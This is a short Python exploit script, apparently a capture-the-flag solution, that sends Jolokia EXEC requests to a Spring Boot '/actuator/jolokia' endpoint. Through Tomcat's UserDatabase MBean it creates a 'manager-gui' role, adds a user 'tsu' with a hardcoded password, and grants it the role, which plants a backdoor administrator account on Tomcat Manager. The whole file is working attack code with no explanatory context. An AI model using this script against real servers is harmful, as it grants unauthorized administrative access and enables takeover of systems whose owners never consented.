import requests
import sys

def createRole(url):
	data = {
		"type":"EXEC",
		"mbean":"Users:database=UserDatabase,type=UserDatabase",
		"operation":"createRole",
		"arguments": ["manager-gui", ""]
	}
	r = requests.post(url, json=data, headers={"Content-Type":"application/json"})

def createUser(url):
	data = {
		"type":"EXEC",
		"mbean":"Users:database=UserDatabase,type=UserDatabase",
		"operation":"createUser",
		"arguments": ["tsu", "deptrai", ""]
	}
	r = requests.post(url, json=data, headers={"Content-Type":"application/json"})

def addRole(url):
	data = {
		"type":"EXEC",
		"mbean":"Users:database=UserDatabase,type=User,username=\"tsu\"",
		"operation":"addRole",
		"arguments": ["manager-gui"]
	}
	r = requests.post(url, json=data, headers={"Content-Type":"application/json"})

if len(sys.argv) < 2:
	print("python3 solv_logwrite.py <url>")
	exit()

try:
	url = sys.argv[1]+"/actuator/jolokia"
	createRole(url)
	createUser(url)
	addRole(url)
except:
	pass